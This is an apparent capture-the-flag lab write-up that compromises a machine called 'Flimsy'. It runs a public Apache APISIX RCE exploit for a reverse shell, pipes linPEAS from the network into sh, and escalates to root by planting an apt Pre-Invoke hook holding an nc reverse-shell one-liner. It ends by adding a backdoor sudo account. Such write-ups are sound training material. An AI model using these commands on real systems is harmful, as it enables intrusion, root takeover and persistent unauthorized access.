# Flimsy

### Contents
- [Set-up](#set-up)
- [Discovery](#discovery)
- [Foothold](#foothold)
- [Privilege Escalation](#privilege-escalation)
- [Persistence (Bonus)](#persistence-bonus)

## Set-up

1) Ran a `sudo apt-get update`

2) Added target `192.168.59.220` as `target` to `/etc/hosts`

## Discovery

3) Port scanned the target with `nmap -v -T4 -p- target`, got results:

```
PORT      STATE  SERVICE
22/tcp    open   ssh
80/tcp    open   http
3306/tcp  open   mysql
8080/tcp  closed http-proxy
43500/tcp open   unknown
```

4) Service fingerprinting on the 4 open ports (with `nmap -v -T4 -p 22,80,3306,43500 -A target`)

We find the additional info: 

<details>

<summary>`nmap` output</summary>

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
80/tcp    open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Upright
|_http-server-header: nginx/1.18.0 (Ubuntu)
3306/tcp  open  mysql   MySQL (unauthorized)
43500/tcp open  http    OpenResty web app server
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
|_http-server-header: APISIX/2.8
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

</details>

Some notes:

- nmap marked the mysql server as `unauthorized`, meaning the server configuration rejects connections from our IP... so can probably skip trying to connect to that for now
- the openssh and nginx versions are fairly new, so there likely won't be CVEs we can leverage to abuse those
- the openresty server on port 43500 serves a http server header APISIX/2.8, so pretty safe to assume that's an Apache APISIX version 2.8 server

Things to try at this time are:

- check the root directories of the two web servers in the browser, maybe there's a clearly visible login screen to try default admin credentials in, or maybe we'll learn more about the servers to give us more info to search for CVEs
- enumerate paths on the web servers (ports 80 and 43500) with `gobuster`/`dirbuster`
- search for CVEs with APISIX 2.8
- search for CVEs with the versions of openssh and nginx found by nmap

We'll do these four things in parallel since they may take time.

5) Path enumeration against the two webservers completes quickly with no noteworthy findings:

<details>

<summary>`gobuster` results</summary>

```
---(kali?kali)-[~]
--$ gobuster dir -u http://target:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://target:80
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 178] [--> http://target/img/]
/css                  (Status: 301) [Size: 178] [--> http://target/css/]
/js                   (Status: 301) [Size: 178] [--> http://target/js/]
/slick                (Status: 301) [Size: 178] [--> http://target/slick/]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

```                                                                                                                                         
---(kali?kali)-[~]
--$ gobuster dir -u http://target:43500 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://target:43500
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

</details>

Pretty much all paths in both servers return 404s.


6) The root path on the web server on port 80 does serve something though; looks like a web app template, but I search "upright" for CVEs to make sure that's not a well-known vulnerable web app.

![](./assets/upright.png)

Exploit db look-up yields no results for "upright".

7) Moving on, I search exploit-db for the term "apisix":

```
---(kali?kali)-[~]
--$ searchsploit apisix
------------------------------------------------------ ---------------------------------
 Exploit Title                                        |  Path
------------------------------------------------------ ---------------------------------
Apache APISIX 2.12.1 - Remote Code Execution (RCE)    | multiple/remote/50829.py
------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

Look at that! There's an RCE exploit for a version that's higher than the one of the server on port 43500. Reading the exploit code we learn that the CVE affects Apache APISIX versions 1.3 – 2.12.1.

Things are looking good, the exploit ([code](https://www.exploit-db.com/exploits/50829)) seems to set up a reverse shell. At this point I am pretty sure this exploit will get us in the box.

## Foothold

8) I set up my local listener (with `nc -lvnp 443`), and run the exploit code:

```
---(kali?kali)-[~]
--$ python /usr/share/exploitdb/exploits/multiple/remote/50829.py http://target:43500/ 192.168.49.59 443

                                   .     ,                                                                          
        _.._ * __*\./ ___  _ \./._ | _ *-+-                                                                         
       (_][_)|_) |/'\     (/,/'\[_)|(_)| |                                                                          
          |                     |                                                                                   
                                                                                                                    
                (CVE-2022-24112)                                                                                    
{ Coded By: Ven3xy  | Github: https://github.com/M4xSec/ }                                                                                                         
```

And we get a shell!

```
???(kali?kali)-[~]
??$ nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.49.59] from (UNKNOWN) [192.168.59.220] 58294
whoami
franklin
pwd
/root
ls -la
ls: cannot open directory '.': Permission denied
```

We land as user `frankflin` in the root directory.

9) Digging a little, we find the access flag in franflin's home directory:

```
cd /home/franklin
pwd
/home/franklin
ls
etcd-v3.4.13-linux-amd64
etcd-v3.4.13-linux-amd64.tar.gz
local.txt
cat local.txt
859d0250f2864e6a6487bea262107e01
```

## Privilege Escalation

10) Let's not waste any time and run linPEAS to figure out how to escalate ourselves to `root`:

> We download the script from GitHub and pipe it to `sh`

```
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

The most interesting findings are:

- There are three users with consoles:

```
------------ Users with console
ass:x:1000:1000:ass,,,:/home/ass:/bin/bash                                                                          
franklin:x:65534:65534::/home/frank:/bin/bash
root:x:0:0:root:/root:/bin/bash
```

- A user:password combination to try against other users:

```
------------ Analyzing Htpasswd Files (limit 70)
-rw-r--r-- 1 root root 24 Jun 14  2013 /usr/local/apisix/deps/lib/luarocks/rocks-5.1/luasocket/3.0rc1-2/test/auth/.htpasswd                                                                                                             
luasocket:l8n2npozPB.sQ
```

- The machine has the following cron jobs (from `/etc/crontab`):

```

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * * * * root apt-get update
* * * * * root /root/run.sh
```

> Interesting: apt-get update runs as `root`

- Interesting files writable by the current user (**linPEAS highlighted this as 95% PE vector**):

```
------------ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
? https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                   
... (list omitted for brevity)

/etc/apt/apt.conf.d
```

11) I'll start by digging into that writable dir `/etc/apt/apt.conf.d`. I'm thinking that's the package maanger configuration directory, maybe we can get user `root` (via that cron job) to run some code for us.

```
pwd
/etc/apt/apt.conf.d

ls
01-vendor-ubuntu
01autoremove
10periodic
15update-stamp
20apt-esm-hook.conf
20archive
20auto-upgrades
20packagekit
20snapd.conf
50command-not-found
50unattended-upgrades
70debconf
99update-notifier

cat 70debconf
// Pre-configure all packages with debconf before they are installed.
// If you don't like it, comment it out.
DPkg::Pre-Install-Pkgs {"/usr/sbin/dpkg-preconfigure --apt || true";};
```

Wonderful, looks like through these files we can configure apt to run arbitrary code before/after certain actions. I found some resources on how to write such hooks:

- https://www.cyberciti.biz/faq/debian-ubuntu-linux-hook-a-script-command-to-apt-get-upgrade-command/
- https://unix.stackexchange.com/questions/204414/how-to-run-a-command-before-download-with-apt-get

12) We set up a listener in our Kali machine (with `nc -lvnp 80`), and write a file in the current directory to set up a reverse shell:

```
echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.59 80 >/tmp/f"};' > 75nothing-to-see-here
```

We verify the file is there:

```
ls
01-vendor-ubuntu                                                                      
01autoremove                                                                          
10periodic
15update-stamp
20apt-esm-hook.conf
20archive
20auto-upgrades
20packagekit
20snapd.conf
50command-not-found
50unattended-upgrades
70debconf
75nothing-to-see-here
99update-notifier
```

And that it looks the way we expect:

```
cat 75nothing-to-see-here
apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.59 80 >/tmp/f"};
```



13) We wait a while and hope that the cron job picks up our file... After a few seconds we get a catch a shell in our Kali machine - as `root`!

```
??$ nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.49.59] from (UNKNOWN) [192.168.59.220] 34328
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
#
# cd /root
#
# ls
build.sh
default.etcd
flimsy
nohup.out
proof.txt
run.sh
snap
#
# cat proof.txt
65389499e9cd13944ad1756c44e4ef9c
```

And there's our proof! We are done here.

## Persistence (Bonus)

14) Before leaving, we'll add a new linux user to the sudo group so we can come back through the front door (the ssh server):

> Note that I saw earlier that the ssh server already allowed PasswordAuthentication, so we dont't need to modify config nor restart the ssh service.

```
# sudo useradd -m hackerman                                                           
# echo hackerman:hackerman | sudo chpasswd                                            
# sudo usermod -aG sudo hackerman                                                     
# exit
```

15) Testing access

```
---(kali?kali)-[~]
--$ ssh hackerman@target
The authenticity of host 'target (192.168.59.220)' can't be established.
ED25519 key fingerprint is SHA256:bdEzYRpG4k3NkIr03/E2H6ltJRUD52Zi5YA0fkNr/nY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'target' (ED25519) to the list of known hosts.
hackerman@target's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-122-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 28 Feb 2024 05:18:53 PM UTC

  System load:  0.01              Processes:               240
  Usage of /:   76.9% of 9.75GB   Users logged in:         0
  Memory usage: 38%               IPv4 address for ens160: 192.168.59.220
  Swap usage:   0%


13 updates can be applied immediately.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

$ sudo whoami
[sudo] password for hackerman: 
root
```

We are root!